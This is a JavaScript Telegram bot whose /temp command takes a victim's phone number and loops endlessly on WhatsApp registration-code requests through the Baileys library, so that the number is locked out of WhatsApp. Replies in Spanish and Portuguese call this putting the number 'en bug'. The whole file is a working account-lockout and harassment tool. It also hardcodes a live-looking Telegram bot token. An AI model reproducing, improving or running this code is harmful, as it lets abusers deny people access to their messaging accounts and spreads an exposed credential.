const { Telegraf } = require('telegraf');
const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const bot = new Telegraf('6697002708:AAFaETXfkj1R6fTDE0nSpOLvQWunOCZeBj0');

bot.command('temp', async (ctx) => {
  const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));
 
  const start = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('.mm');
    const spam = makeWaSocket({
      auth: state,
      mobile: true,
      logger: pino({ level: 'silent' })
    });

    const dropNumber = async (phoneNumber, ddi, number) => {
      while (true) {
        try {
          const res = await spam.requestRegistrationCode({
            phoneNumber: '+' + phoneNumber,
            phoneNumberCountryCode: ddi,
            phoneNumberNationalNumber: number,
            phoneNumberMobileCountryCode: 724
          });
          const b = (res.reason === 'temporarily_unavailable');
          if (b) {
            ctx.reply(`Número 5 minutos: ${res.login}`);
            await new Promise(resolve => setTimeout(resolve, 5000000)); 
          }
        } catch (error) {
          console.log(error);
        }
      }
    };

    const input = ctx.message.text.split(' ');
    const ddi = input[1];
    const number = input.slice(2).join(''); 

    if (!ddi || !number) {
      ctx.reply('Coloque el codigo de pais sin el + ejemplo 1 8295554684: "/temp 1 8295554684".');
      return;
    }

    const phoneNumber = ddi + number;
    ctx.reply(`Numero puesto en bug 5 minutos.: ${ddi}${number}`);
    numbers[phoneNumber] = { ddi, number };
    fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, 2));
    await dropNumber(phoneNumber, ddi, number);
  };
    start();
});

bot.launch();